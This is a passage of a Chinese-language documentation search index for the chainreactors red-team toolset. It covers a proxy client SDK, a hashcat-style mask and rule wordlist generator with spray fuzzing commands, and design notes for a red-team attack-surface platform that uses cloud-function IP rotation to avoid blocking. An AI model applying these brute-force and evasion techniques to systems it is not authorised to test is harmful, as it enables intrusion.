\u534f\u8bae\u540d\u79f0  </li> <li>factory: \u534f\u8bae\u5de5\u5382\u51fd\u6570  </li> </ul> <p>\u793a\u4f8b\uff1a  </p> <pre><code>proxyclient.RegisterScheme(\"MYPROXY\", func(proxy *url.URL, upstreamDial Dial) (Dial, error) {  \n    // \u5b9e\u73b0\u81ea\u5b9a\u4e49\u4ee3\u7406\u534f\u8bae  \n    return func(ctx context.Context, network, address string) (net.Conn, error) {        // \u5b9e\u73b0\u8fde\u63a5\u903b\u8f91  \n        return nil, nil    \n}, nil})  \n</code></pre>"},{"location":"libs/proxyclient/sdk/#supportedschemes","title":"SupportedSchemes","text":"<p>\u83b7\u53d6\u6240\u6709\u652f\u6301\u7684\u4ee3\u7406\u534f\u8bae\u3002  </p> <pre><code>func SupportedSchemes() []string  \n</code></pre> <p>\u793a\u4f8b\uff1a  </p> <pre><code>schemes := proxyclient.SupportedSchemes()  \nfmt.Println(\"Supported protocols:\", schemes)  \n</code></pre>"},{"location":"libs/proxyclient/sdk/#\u5de5\u5177\u51fd\u6570","title":"\u5de5\u5177\u51fd\u6570","text":""},{"location":"libs/proxyclient/sdk/#parseproxyurls","title":"ParseProxyURLs","text":"<p>\u89e3\u6790\u591a\u4e2a\u4ee3\u7406 URL \u5b57\u7b26\u4e32\u3002  </p> <pre><code>func ParseProxyURLs(proxyURL []string) ([]*url.URL, error)  \n</code></pre> <p>\u53c2\u6570\uff1a  </p> <ul> <li>proxyURL: \u4ee3\u7406 URL \u5b57\u7b26\u4e32\u5217\u8868  </li> </ul> <p>\u793a\u4f8b\uff1a  </p> <pre><code>urls := []string{  \n    \"http://localhost:8080\",   \n    \"socks5://localhost:1080\",\n}  \nproxies, err := proxyclient.ParseProxyURLs(urls)  \n</code></pre>"},{"location":"libs/proxyclient/sdk/#dialwithtimeout","title":"DialWithTimeout","text":"<p>\u521b\u5efa\u5e26\u8d85\u65f6\u7684\u8fde\u63a5\u5668\u3002  </p> <pre><code>func DialWithTimeout(timeout time.Duration) Dial  \n</code></pre> <p>\u53c2\u6570\uff1a  </p> <ul> <li>timeout: \u8fde\u63a5\u8d85\u65f6\u65f6\u95f4  </li> </ul> <p>\u793a\u4f8b\uff1a  </p> <pre><code>dial := proxyclient.DialWithTimeout(5 * time.Second)  \nconn, err := dial(context.Background(), \"tcp\", \"example.com:80\")  \n</code></pre>"},{"location":"libs/words/","title":"words \u00b7 index","text":""},{"location":"libs/words/#overview","title":"overview","text":"<p>repo: https://github.com/chainreactors/words</p> <p>\u8be5\u5e93\u4f5c\u4e3aspray\u548czombie\u7684\u57fa\u7840\u80fd\u529b\u7684\u4e00\u90e8\u5206, \u662f hashcat \u7684 rule/mask \u751f\u6210\u5668\u7684 go \u91cd\u6784(\u5e76\u4e0d\u5b8c\u5168\u4e00\u81f4)\u3002</p>"},{"location":"libs/words/#\u57fa\u4e8e\u63a9\u7801\u7684\u5b57\u5178\u751f\u6210-20240521-update","title":"\u57fa\u4e8e\u63a9\u7801\u7684\u5b57\u5178\u751f\u6210 (2024.05.21 update)","text":"<p>\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd, \u7f16\u5199\u4e86\u4e00\u95e8\u540d\u4e3a mask \u7684\u6a21\u677f\u8bed\u8a00. \u4ee3\u7801\u4f4d\u4e8e: mask.</p> <p>\u4f7f\u7528\u6848\u4f8b</p> <p><code>spray -u http://example.com -w '/{?l#3}/{?ud#3}</code></p> <p>\u542b\u4e49\u4e3a, <code>/\u5168\u90e8\u4e09\u4f4d\u5c0f\u5199\u5b57\u6bcd/\u5168\u90e8\u4e09\u4f4d\u5927\u5199\u5b57\u6bcd+\u6570\u5b57</code>\u7ec4\u6210\u7684\u5b57\u5178.</p> <p>\u6240\u6709\u7684 mask \u751f\u6210\u5668\u90fd\u9700\u8981\u901a\u8fc7<code>{}</code>\u5305\u88f9, \u5e76\u4e14\u62ec\u53f7\u5185\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5fc5\u987b\u4e3a<code>?</code>, <code>$</code>\u5176\u4e2d\u4e4b\u4e00. </p> <p><code>#</code>\u540e\u7684\u6570\u5b57\u8868\u793a\u91cd\u590d\u6b21\u6570, \u53ef\u7559\u7a7a, \u4f8b\u5982<code>{?lu}</code> , \u8868\u793a\"\u5168\u90e8\u5c0f\u5199\u5b57\u6bcd+\u5168\u90e8\u5927\u5199\u5b57\u6bcd\"\u7ec4\u6210\u7684\u5b57\u5178.</p> <ul> <li><code>?</code> \u8868\u793a\u666e\u901a\u7684\u7b1b\u5361\u5c14\u79ef. \u4f8b\u5982<code>{?l#3}</code>\u8868\u793a\u751f\u6210\u4e09\u4f4d\u5c0f\u5199\u5b57\u6bcd\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408</li> <li><code>$</code> \u8868\u793a\u8d2a\u5a6a\u6a21\u5f0f, \u4f8b\u5982<code>{$l#3}</code>\u8868\u793a 3 \u4f4d\u5c0f\u5199\u5b57\u6bcd\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408+2 \u4f4d\u5c0f\u5199\u5b57\u6bcd\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408+1 \u4f4d\u5c0f\u5199\u5b57\u6bcd\u7684\u6240\u6709\u53ef\u80fd\u7ec4\u5408</li> </ul> <p>\u63a9\u7801\u7684\u5b9a\u4e49\u53c2\u8003\u4e86 hashcat, \u4f46\u662f\u5e76\u4e0d\u5b8c\u5168\u76f8\u540c. \u76ee\u524d\u53ef\u7528\u7684\u5173\u952e\u5b57\u5982\u4e0b\u8868:</p> <pre><code>\"l\": Lowercase,  // 26\u4e2a\u5c0f\u5199\u5b57\u6bcd\n\"u\": Uppercase,  // 26\u4e2a\u5927\u5199\u5b57\u6bcd\n\"w\": Letter,     // 52\u5927\u5199+\u5c0f\u5199\u5b57\u6bcd\n\"d\": Digit, // \u6570\u5b570-9\n\"h\": LowercaseHex, // \u5c0f\u5199hex\u5b57\u7b26, 0-9 + a-f\n\"H\": UppercaseHex, // \u5927\u5199hex\u5b57\u7b26, 0-9 + A-F\n\"x\": Hex,          // \u5927\u5199+\u5c0f\u5199hex\u5b57\u7b26, 0-9 + a-f + A-F\n\"p\": Punctuation,  // \u7279\u6b8a\u5b57\u7b26 !\\\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~\n\"P\": Printable,    // \u53ef\u89c1\u7684ascii\u5b57\u7b26\n\"s\": Whitespace,   // \u7a7a\u5b57\u7b26 \\t\\n\\r\\x0b\\x0c\n</code></pre> <p>\u652f\u6301\u901a\u8fc7\u6570\u5b57\u8868\u793a\u547d\u4ee4\u884c\u8f93\u5165\u7684\u5b57\u5178\u5e8f\u53f7, \u4f8b\u5982</p> <p><code>spray -u http://example.com -w '/{?0u#2}/{?01}' -d word0.txt -d word1.txt</code></p> <p>\u5176\u4e2d<code>{?0u#2}</code>\u8868\u793a word0.txt \u7684\u6240\u6709\u5185\u5bb9+\u6240\u6709\u5927\u5199\u5b57\u6bcd\u7b1b\u5361\u5c14\u79ef\u4e24\u6b21, <code>{?01}</code> \u8868\u793a word0.txt + word1.txt \u7684\u6240\u6709\u5185\u5bb9.</p>"},{"location":"libs/words/#\u5206\u9694\u7b26\u4e0e\u8f6c\u4e49\u7b26","title":"\u5206\u9694\u7b26\u4e0e\u8f6c\u4e49\u7b26","text":"<p><code>|</code>\u4e3a\u5206\u9694\u7b26, <code>\\</code> \u4e3a\u8f6c\u4e49\u7b26. \u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e24\u4e2a\u5728\u539f\u6709\u7684\u63a9\u7801\u7c7b\u578b\u4e0a\u65b0\u589e\u5b57\u6bb5.  <code>{?d|\\l|\\d#2}</code> \u8868\u793a\u4e3a0-9\u52a0\u4e0a<code>l</code>\u548c<code>d</code>, \u4e00\u517112\u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u5b57\u5178\u7684\u6240\u6709\u4e24\u4f4d\u957f\u5ea6\u7684\u5b57\u5178\u7ec4\u5408. </p>"},{"location":"libs/words/#\u5173\u952e\u5b57","title":"\u5173\u952e\u5b57","text":"<p>\u5173\u952e\u5b57\u914d\u7f6e\u6587\u4ef6: https://github.com/chainreactors/templates/blob/master/zombie/keywords.yaml</p> <p><code>{?u|@year|@month}</code> \u8868\u793a\u6240\u6709\u7684\u5927\u5199\u5b57\u6bcd\u4e0e\u6240\u6709\u7684\u5e74\u4efd\u548c\u6708\u4efd\u7ec4\u6210\u7684\u5b57\u5178. </p> <p>\u5173\u952e\u5b57\u76ee\u524d\u8fd8\u5728\u4e0d\u65ad\u5b8c\u5584\u4e2d, \u6b22\u8fce\u63d0\u4f9b\u9700\u6c42.</p>"},{"location":"libs/words/#\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u5178\u751f\u6210","title":"\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u5178\u751f\u6210","text":"<p>\u5b9e\u73b0 rule-base \u7684\u5b57\u5178\u751f\u6210\u5668\u540c\u6837\u7f16\u5199\u4e86\u4e00\u95e8\u6a21\u677f\u8bed\u8a00, \u4ee3\u7801\u5728 rule</p> <p>\u89c4\u5219\u8bed\u6cd5\u8bf7\u53c2\u8003 hashcat_rule_base</p> <p>\u76ee\u524d\u9664\u4e86 M(Memorize)\u7684\u89c4\u5219\u5df2\u7ecf\u5168\u90e8\u5b9e\u73b0. \u5e76\u4e14\u53bb\u6389\u4e86 hashcat \u7684\u4e00\u4e9b\u9650\u5236, \u6bd4\u5982\u6700\u591a\u652f\u6301 5 \u4e2a\u89c4\u5219, \u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u80fd\u5927\u4e8e 10 \u7b49.</p> <p>\u76ee\u524d\u5b9e\u73b0\u7684\u89c4\u5219\u5982\u4e0b\u8868\uff0c \u6765\u81ea hashcat \u6587\u6863</p> <p></p> <p>\u76ee\u524d\u652f\u6301\u7684\u8fc7\u6ee4\u89c4\u5219\u5982\u4e0b\u8868:</p> <p></p> <p>rule \u7406\u8bba\u4e0a\u5e94\u8be5\u8981\u4e0e hashcat \u7684 rule-base \u7ed3\u679c\u5b8c\u5168\u4e00\u81f4, \u4f46\u5982\u679c\u4e0e hashcat \u7684\u7ed3\u679c\u4e0d\u4e00\u81f4, \u8bf7\u63d0\u4ea4 issue.</p> <p>\u8fd9\u91cc\u6709\u4e00\u4e9b hashcat \u81ea\u5e26\u7684\u89c4\u5219\u793a\u4f8b, \u4f46 hashcat \u4e00\u822c\u7528\u6765\u751f\u6210\u5bc6\u7801\u5b57\u5178, \u56e0\u6b64\u5bf9\u4e8e\u76ee\u5f55\u7206\u7834\u7684\u89c4\u5219\u8fd8\u9700\u8981\u91cd\u65b0\u79ef\u7d2f.</p>"},{"location":"mapping/","title":"index","text":""},{"location":"mapping/#overview","title":"overview","text":"<p>\u672c\u6587\u6863\u4e3a\u9884\u89c8\u6587\u6863. \u9884\u8ba1\u5728 2024 \u5e74\u5185\u53d1\u5e03</p> <p>mapping \u662f\u4e00\u4e2a\u9762\u5411\u7ea2\u961f\u7684\u653b\u51fb\u9762\u7ba1\u7406\u5e73\u53f0(ASM). \u4e5f\u662f chainreactor \u8ba1\u5212\u4e2d\u7684\u7ec8\u6781\u76ee\u6807. \u968f\u7740\u5de5\u5177\u94fe\u7684\u6210\u719f, \u7ec8\u4e8e\u53ef\u4ee5\u91cd\u6784\u4e24\u5e74\u524d\u7684\u90a3\u5957 demo. \u5c06\u5176\u53d8\u4e3a\u5f53\u4e4b\u65e0\u6127\u7684 ASM.</p> <p>mapping \u4e0d\u662f\u4e0d\u540c\u5de5\u5177\u7684\u5806\u79ef, \u800c\u662f\u8fbe\u5230\u4e34\u754c\u8d28\u91cf\u7684\u94fe\u5f0f\u53cd\u5e94\u3002</p>"},{"location":"mapping/#\u76ee\u5f55","title":"\u76ee\u5f55","text":"<ol> <li>\u8bbe\u8ba1\u7406\u5ff5</li> </ol>"},{"location":"mapping/concept/","title":"mapping \u00b7 \u6982\u5ff5","text":""},{"location":"mapping/concept/#worker","title":"Worker","text":""},{"location":"mapping/concept/#linker","title":"Linker","text":""},{"location":"mapping/concept/#workflow","title":"Workflow","text":""},{"location":"mapping/concept/#tool","title":"Tool","text":""},{"location":"mapping/concept/#artifact","title":"Artifact","text":""},{"location":"mapping/concept/#app","title":"App","text":""},{"location":"mapping/design/","title":"mapping \u00b7 \u8bbe\u8ba1","text":""},{"location":"mapping/design/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u57282024\u5e74ASM\u5df2\u7ecf\u88ab\u5e7f\u6cdb\u4f7f\u7528, \u4e0d\u8bba\u662f\u5404\u5bb6\u4e59\u65b9\u7684ASM\u4ea7\u54c1, \u8fd8\u662f\u5404\u5bb6\u7ea2\u961f\u7684\u81ea\u52a8\u5316\u626b\u63cf\u5668. \u53ea\u8981\u662f\u4e4b\u524d\u5728\u505a\u626b\u63cf\u5668\u7684, \u90fd\u8bd5\u56fe\u5728\u8fd9\u4e2a\u9886\u57df\u65bd\u5c55\u62f3\u811a. \u76ee\u524d\u597d\u7528\u7684ASM\u4ee5\u5546\u4e1a\u5316\u5de5\u5177\u4e3a\u4e3b, \u5728\u5f00\u6e90\u4e16\u754c\u5e76\u4e0d\u5b58\u5728\u771f\u6b63\u610f\u4e49\u4e0a\u7684ASM\u7684(\u4e4b\u540e\u4f1a\u89e3\u91ca\u8fd9\u4e48\u8bf4\u7684\u539f\u56e0)</p>"},{"location":"mapping/design/#\u5f00\u6e90\u4e16\u754c","title":"\u5f00\u6e90\u4e16\u754c","text":"<p>ASM\u4e0e\u8d44\u4ea7\u53d1\u73b0\u5de5\u5177\u5b58\u5728\u4e00\u5b9a\u7684\u6df7\u6dc6, \u8fd9\u91cc\u63d0\u5230\u7684\u5de5\u5177\u6682\u65f6\u4e0d\u533a\u5206\u8fd9\u4e24\u4e2a\u6982\u5ff5</p> <ul> <li>https://github.com/yogeshojha/rengine \u6709\u4e00\u4e2a\u975e\u5e38\u4e0d\u9519\u7684UI, \u80fd\u5c06\u8bb8\u591a\u77e5\u540d\u5de5\u5177\u8054\u52a8\u8d77\u6765, \u7528\u6237\u4f53\u9a8c\u4e0d\u9519, \u4f46\u80fd\u529b\u4e5f\u4ec5\u9650\u4e8e\u5de5\u5177\u4e32\u8054</li> <li>https://github.com/Aabyss-Team/ARL  \u539f\u4ed3\u5e93\u5df2\u5220\u9664, \u8fd9\u4e2a\u662fstar\u8f83\u591a\u7684\u5907\u4efd\u4ed3\u5e93. \u4e0d\u80fd\u5206\u90e8\u7f72\u90e8\u7f72, \u626b\u63cf\u7528\u7684\u5de5\u4ef6\u4e5f\u8f83\u8001, \u4e0d\u80fd\u5f88\u597d\u7684\u9002\u914d\u73b0\u4ee3\u7684\u573a\u666f</li> <li>https://github.com/Autumn-27/ScopeSentry \u975e\u5e38\u4f18\u96c5\u7684UI, \u4f46\u80fd\u529b\u4e0eARL\u76f8\u4f3c, \u7edd\u5927\u591a\u6570\u80fd\u529b\u6765\u81ea\u5de5\u5177\u94fe\u7684\u4e32\u8054. \u5e76\u6ca1\u6709\u63d0\u4f9b\u4f18\u5148\u7ea7\u6392\u5e8f\u7684\u7b97\u6cd5, \u4e5f\u6ca1\u6709\u63d0\u4f9b\u6570\u636e\u4e4b\u95f4\u7684\u5173\u8054, \u6e05\u6670, \u6807\u8bb0\u7b49.</li> </ul> <p>\u5f00\u6e90\u4e16\u754c\u7684ASM\u57fa\u672c\u4e0a\u90fd\u6ca1\u6709\u8d85\u8d8a \u5de5\u5177\u7684\u4e32\u8054\u8fd0\u884c \u8fd9\u4e2a\u601d\u8def (\u5b9e\u9645\u4e0a\u90e8\u5206\u5546\u4e1a\u5316\u4ea7\u54c1\u4e5f\u6ca1\u597d\u5230\u54ea\u91cc\u53bb).</p>"},{"location":"mapping/design/#\u8bbe\u8ba1\u7406\u5ff5","title":"\u8bbe\u8ba1\u7406\u5ff5","text":"<p>ASM\u662f\u4e2a\u975e\u5e38\u5e74\u8f7b\u7684\u6982\u5ff5\uff0c\u8131\u80ce\u4e8e\u81ea\u52a8\u5316\u626b\u63cf\u5668\uff0c\u878d\u5165\u4e86\u4e00\u4e9b\u65b0\u7684\u6982\u5ff5\u3002\u4e5f\u56e0\u6b64\uff0c\u7edd\u5927\u591a\u6570ASM\u672c\u8d28\u4e0a\u90fd\u662f\u591a\u4e2a\u539f\u672c\u5c31\u5b58\u5728\u7684\u5de5\u5177\u7684\u7f16\u6392\u4e0e\u6570\u636e\u5206\u6790\uff0c\u8fd9\u6837\u7684\u5b9e\u73b0\u7b26\u5408\u73b0\u5b9e\u4e2d\u7532\u65b9\u7684\u9700\u6c42\u3002\u4f46\u8fd9\u5e76\u4e0d\u662f\u552f\u4e00\u7684\u8def\u7ebf\u3002 </p> <p>\u5728\u7ea2\u961f\u573a\u666f\u4e2d\uff0c \u6211\u4eec\u4f1a\u64cd\u4f5c\u591a\u4e2a\u5de5\u5177\u8fdb\u884c\u5404\u65b9\u9762\u7684\u4fe1\u606f\u6536\u96c6\u3001\u626b\u63cf\u63a2\u6d4b\u3001\u6f0f\u6d1e\u5229\u7528\u7b49\u7b49\u63a2\u6d4b\u3002\u8fd9\u91cc\u53ef\u80fd\u4f1a\u9047\u5230\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898\uff1a</p> <ol> <li>\u5982\u679cIP\u88ab\u5c01\u4e86\uff0c \u9700\u8981\u624b\u52a8\u5207\u6362\u4ee3\u7406\u6216\u6362\u4e00\u53f0\u673a\u5668</li> <li>\u4eba\u603b\u662f\u6709\u60f0\u6027\uff0c\u4e0d\u4f1a\u628a\u6bcf\u4e00\u4e2a\u53ef\u80fd\u6027\u90fd\u8fdb\u884c\u6d4b\u8bd5</li> <li>\u6570\u636e\u5904\u7406\u9ebb\u70e6\uff0c \u9700\u8981\u624b\u52a8\u5904\u7406\u4e0a\u4e00\u9636\u6bb5\u7684\u6570\u636e\uff0c\u5e76\u4e14\u6839\u636e\u4fe1\u606f\u5236\u5b9a\u4e0b\u4e00\u6b65\u7684\u884c\u52a8\u8ba1\u5212 </li> <li>\u4fe1\u606f\u4ea4\u4e92\u56f0\u96be\uff0c \u56e2\u961f\u534f\u4f5c\u65f6\u6709\u5927\u91cf\u91cd\u590d\u52b3\u52a8\u4ee5\u53ca\u4fe1\u606f\u5171\u4eab\u56f0\u96be</li> </ol> <p>\u4f20\u7edf\u7684\u81ea\u52a8\u5316\u626b\u63cf\u5668\u63a5\u8fd1\u4e0d\u4e86\u8fd9\u4e9b\u95ee\u9898\uff0c \u73b0\u4ee3\u7684ASM\u4e5f\u89e3\u51b3\u4e0d\u4e86\u8fd9\u4e9b\u95ee\u9898\u3002\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u8d70\u4e00\u6761\u65b0\u7684\u9053\u8def\u3002</p> <p>\u57282022\u5e74\u7684mapping\u521d\u7248\u65f6\uff0c \u5df2\u7ecf\u6709\u4e86\u5927\u81f4\u7684\u6838\u5fc3\u8bbe\u8ba1\u7406\u5ff5\u3002 \u800c\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u52a0\u5165\u4e00\u4e9b\u65b0\u7684\u7406\u5ff5\u3002 </p> <ul> <li>\u5de5\u4ef6\u5316\u53ef\u62d3\u5c55\u53ef\u7f16\u6392\uff0cASM\u7684\u6838\u5fc3\u53ea\u662f\u4e00\u4e2a\u8c03\u53d6\u5f15\u64ce\u4e0e\u6570\u636e\u5206\u6790\u5f15\u64ce\uff0c \u6240\u6709\u7684\u529f\u80fd\u90fd\u662f\u88ab\u62d3\u5c55\u51fa\u6765\u5e76\u4e14\u53ef\u4ee5\u88ab\u81ea\u7531\u7ec4\u5408\u7f16\u6392\u7684</li> <li>\u5206\u5e03\u5f0f\u4e0e\u81ea\u52a8\u5316\u8c03\u5ea6\uff0c\u57fa\u4e8e\u591a\u4e91\u67b6\u6784\u4e0e\u4e91\u51fd\u6570\u5b9e\u73b0\u5206\u5e03\u5f0f\u90e8\u7f72</li> <li>AI\u9a71\u52a8 \uff0c \u57282025\u5e74\uff0cAI agent\u904d\u5730\u5f00\u82b1\u7684\u8f6c\u6298\u70b9\uff0c ASM\u8fd9\u6837\u7684\u67b6\u6784\u66f4\u52a0\u9002\u5408\u5f15\u5165ASM\u4ee3\u66ff\u4eba\u5de5\u53bb\u6307\u5b9a\u626b\u63cf\u7b56\u7565</li> <li>\u56e2\u961f\u534f\u4f5c\uff0c ASM\u4e5f\u53ef\u4ee5\u50cfC2\u4e00\u6837\u53d8\u6210\u56e2\u961f\u534f\u4f5c\u5e73\u53f0</li> <li>\u9ad8\u4ea4\u4e92\uff0c \u9762\u5411\u7ea2\u961f\u7684ASM\u4e0d\u518d\u662f\u4e00\u4e2a\u50bb\u74dc\u5f0f\u7684\u81ea\u52a8\u5316\u626b\u63cf\u5e73\u53f0\uff0c \u800c\u662f\u9700\u8981\u4eba\u5de5\u5f15\u5bfc\u7684\u534a\u81ea\u52a8\u5de5\u5177\uff0c\u63d0\u4f9b\u4e00\u5957 pre-exploit\u7684\u57fa\u7840\u8bbe\u65bd\u3002 </li> </ul>"},{"location":"mapping/design/#\u67b6\u6784","title":"\u67b6\u6784","text":"<p>mapping\u6700\u65e9\u5f00\u59cb\u4e8e2022\u5e74, \u90a3\u4e2a\u65f6\u5019ASM\u7684\u6982\u5ff5\u521a\u521a\u8bde\u751f, projectdiscovery\u521a\u521a\u5f62\u6210\u793e\u533a,  \u66f4\u591a\u7684\u8fd8\u662f\u5404\u79cd\u81ea\u52a8\u5316\u626b\u63cf\u5668\u3002\u800c\u4e2d\u95f4\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u8fdb\u884c\u4e86\u591a\u6b21\u91cd\u6784\u548c\u63a8\u8fdf\uff0c\u57282024\u5e74\u4e2d\u65ec\u5b8c\u6210\u4e86v0.0.1\u7684demo\uff0c \u4f46\u53d7\u9650\u4e8e\u7cbe\u529b\uff0c\u53ea\u5b8c\u6210\u4e86\u57fa\u7840\u67b6\u6784\uff0c\u8fd8\u7b97\u4e0d\u4e0a\u4e00\u4e2a\u53ef\u4ee5\u5b9e\u6218\u7684\u5de5\u5177\u3002 </p> <p></p> <p>\u67b6\u6784\u5206\u4e3a\u4e09\u5c42</p> <ul> <li>\u57fa\u7840\u8bbe\u65bd\u5c42</li> <li>\u5206\u5e03\u5f0f\u8c03\u5ea6\u5c42</li> <li>\u6570\u636e\u5c42</li> </ul>"},{"location":"mapping/design/#\u5de5\u4ef6\u5c42","title":"\u5de5\u4ef6\u5c42","text":"<p>mapping\u7684v0.0.1\u7248\u672c\u4e3b\u8981\u5173\u6ce8\u5916\u90e8\u653b\u51fb\u9762, \u7b2c\u4e00\u6279\u5f15\u5165\u7684\u5de5\u4ef6\u6709:</p> <p>chainreactor</p> <ul> <li>gogo, \u7aef\u53e3\u626b\u63cf, \u6307\u7eb9\u8bc6\u522b </li> <li>searcher, \u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\u4ea4\u53c9\u722c\u866b</li> <li>zombie, \u51ed\u8bc1\u7206\u7834</li> <li>urlfounder, \u88ab\u52a8url\u6536\u96c6, </li> <li>spray, http fuzzer</li> <li>nali, \u89e3\u6790ip\u5f52\u5c5e</li> <li>company, \u5de5\u5546\u4fe1\u606f\u722c\u866b</li> <li>cdnchecker, \u652f\u6301\u4e2d\u56fd\u5730\u533a\u670d\u52a1\u5546\uff0c\u5224\u65adcdn, \u4e91, \u4e91waf</li> </ul> <p>projectdiscovery:</p> <ul> <li>asnmap, \u89e3\u6790asn</li> <li>mapcidr, ip\u5de5\u5177\u96c6\u5408</li> <li>dnsx, dns\u4fe1\u606f\u6536\u96c6</li> <li>httpx, http\u534f\u8bae\u57fa\u672c\u4fe1\u606f, </li> <li>naabu, \u7aef\u53e3\u9884\u63a2\u6d4b</li> <li>nuclei, \u6f0f\u626b</li> <li>shuffledns, dns\u7206\u7834</li> <li>subfinder, \u5b50\u57df\u540d\u6536\u96c6</li> <li>urlfinder, \u88ab\u52a8url\u6536\u96c6</li> </ul> <p>\u8fd9\u4e9b\u5de5\u4ef6\u57fa\u672c\u8986\u76d6\u7edd\u5927\u90e8\u5206\u5de5\u4f5c\u573a\u666f. ASM\u5f15\u64ce\u672c\u4f53\u4e0d\u4f1a\u4e0e\u76ee\u6807\u53d1\u751f\u4efb\u4f55\u63a5\u89e6. </p>"},{"location":"mapping/design/#\u57fa\u7840\u8bbe\u65bd\u5c42","title":"\u57fa\u7840\u8bbe\u65bd\u5c42","text":"<p>\u57fa\u7840\u8bbe\u65bd\u5c42\u5206\u4e3a\u4efb\u52a1\u8c03\u5ea6\u4e0e\u5206\u5e03\u5f0f\u57fa\u7840\u8bbe\u65bd\u81ea\u52a8\u5316\u90e8\u7f72\u4e24\u90e8\u5206\u3002 </p> <p>\u5de5\u4ef6\u5c42\u7684\u6240\u6709\u5de5\u4ef6\u90fd\u8fd0\u884c\u5728\u5206\u5e03\u5f0f\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\uff0c\u53ef\u4ee5\u88abmapping\u81ea\u52a8\u5316\u8c03\u5ea6\u3001\u521b\u5efa\u3001\u7ba1\u7406\u7684\u57fa\u7840\u8bbe\u65bd\u5305\u62ec\u3002</p> <ul> <li>\u4e91\u51fd\u6570, (\u4e3b\u8981\u624b\u6bb5)\uff0c\u52a8\u6001\u4f38\u7f29\u6269\u5bb9\uff0c\u52a8\u6001IP</li> <li>ECS, \u4f5c\u4e3a\u4e91\u51fd\u6570\u7684\u8865\u5145\uff0c \u7ed5\u8fc7\u4e91\u51fd\u6570\u7684\u4e00\u4e9b\u9650\u5236</li> <li>\u672c\u5730+\u4ee3\u7406\u6c60</li> </ul> <p>\u8c03\u5ea6\u5668\u57fa\u4e8eprefect\u5b9e\u73b0\uff0c\u901a\u8fc7workflow\u4e0etask\u7684\u62bd\u8c61\uff0c \u5c06\u591a\u4e2a\u5de5\u4ef6\u7f16\u6392\u6210\u6700\u5c0f\u5de5\u4f5c\u6d41\u5355\u5143\u3002 </p> <p>\u4f8b\u5982 \uff1a</p> <p>\u8f93\u5165\u57df\u540d\u7684\u5de5\u4f5c\u6d41\u793a\u4f8b:  domain workflow1 <pre><code>     -[subfinder]-&gt; \n\u57df\u540d                  -&gt; httpx+gogo -&gt; nuclei\n      -[searcher]-&gt;\n</code></pre></p> <p>domain workflow2 <pre><code>\u57df\u540d -[icp]-&gt; \u516c\u53f8\u4fe1\u606f -company-&gt; \u57df\u540d(\u5c06\u7ed3\u679c\u6267\u884cdomain workflow1)\n</code></pre></p> <p>\u6bcf\u4e2aworkflow\u4e4b\u95f4\u6309\u7167\u987a\u5e8f\u6267\u884c\uff0c \u4e0d\u540cworkflow\u4e4b\u95f4\u5f02\u6b65\u6267\u884c\uff0c \u6700\u5927\u5316\u626b\u63cf\u901f\u5ea6\uff0c \u4e0d\u4f1a\u56e0\u4e3a\u67d0\u4e2a\u4efb\u52a1\u5360\u7528\u5927\u91cf\u65f6\u95f4\u5bfc\u81f4\u7684\u963b\u585e.</p> <p>\u4e2d\u95f4\u6bcf\u4e2a\u5de5\u4ef6\u90fd\u4f1a\u6709\u8f93\u5165\u4e0e\u8f93\u51fa\uff0c\u4f1a\u4fdd\u5b58\u5e76\u7f13\u5b58\u6240\u6709\u7684\u539f\u59cb\u6570\u636e\u5e76\u5f02\u6b65\u8fdb\u5165\u6570\u636e\u5c42\u7684\u5904\u7406\u4e2d\u3002 </p>"},{"location":"mapping/design/#\u6570\u636e\u5c42","title":"\u6570\u636e\u5c42","text":"<p>\u6570\u636e\u5c42\u5305\u62ec\u4ee5\u4e0b\u57fa\u7840\u8bbe\u65bd</p> <ul> <li>postgre \uff0c\u4f5c\u4e3a\u6570\u636e\u6e56\uff0c\u4fdd\u7559\u539f\u59cb\u6570\u636e\u3002 \u5355\u4e2a\u76ee\u6807\u5de5\u4ef6\u4efb\u52a1\u5927\u6982\u7387\u4e0d\u4f1a\u8d85\u8fc710w\uff0c\u6570\u636e\u6761\u76ee\u4e0d\u4f1a\u8d85\u8fc71000w\u3002 postgre\u5df2\u7ecf\u53ef\u4ee5\u80dc\u4efb\uff0c \u5982\u679c\u8981\u5927\u89c4\u6a21\u90e8\u7f72\u53ef\u80fd\u8fd8\u9700\u8981ELB\u6216\u8005\u66f4\u5f3a\u7684\u6570\u636e\u6e56\u89e3\u51b3\u65b9\u6848\u3002</li> <li>neo4j\uff0c \u56fe\u6570\u636e\u5e93\uff0c \u6570\u636e\u5173\u8054\uff0c\u6570\u636e\u7b5b\u9009\uff0c \u6570\u636e\u6eaf\u6e90\u7684\u6838\u5fc3\uff0c \u6240\u6709\u7684\u6570\u636e\u90fd\u4f1a\u6309\u7167\u53d1\u73b0\u987a\u5e8f\u5728neo4j\u4e2d\u5173\u8054\u3002 </li> <li>redis\uff0c \u6570\u636e\u7f13\u5b58\uff0c\u9632\u6b62\u540c\u4e00\u4e2a\u76ee\u6807\u88ab\u4e0d\u540c\u5de5\u4ef6\u53d1\u73b0\u5bfc\u81f4\u7684\u91cd\u590d\u626b\u63cf\u3002 </li> </ul> <p>\u7528\u6237\u64cd\u4f5c\u4e0e\u6570\u636e\u5c55\u793a:</p> <ul> <li>restful api\uff0c \u7528\u6765\u6dfb\u52a0\u3001\u7ba1\u7406\u3001\u67e5\u8be2\u4efb\u52a1\u3002 \u4f46\u5b9e\u9645\u7684\u4efb\u52a1\u8c03\u5ea6\u4f1a\u4ea4\u7ed9\u8c03\u5ea6\u5668\u81ea\u52a8\u5206\u914d</li> <li>repl cli \uff0c\u4ea4\u4e92\u5f0f\u547d\u4ee4\u7a0b\u5e8f</li> 